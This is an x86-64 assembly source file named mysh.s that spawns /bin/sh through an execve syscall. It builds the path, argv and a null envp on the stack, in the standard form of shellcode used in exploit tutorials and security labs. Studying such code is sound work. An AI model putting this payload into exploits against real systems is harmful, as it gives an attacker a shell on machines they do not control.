; This file is called mysh.s
BITS 64

section .text
global _start

_start:
	; Store "/bin//sh" string on stack
	xor rax, rax
	push rax ; NULL terminator
	mov rbx, 0x68732f2f6e69622f ; hs//nib/” - "/bin//sh" reversed
	push rbx
	mov rdi, rsp ; rdi = pointer to "/bin//sh"
	; Construct argv[]
	push rax ; argv[1] = NULL
	push rdi ; argv[0] = pointer to string
	mov rsi, rsp ; rsi = argv
	; envp = NULL
	xor rdx, rdx
	; execve syscall
	mov rax, 59 ; syscall number for execve
	syscall
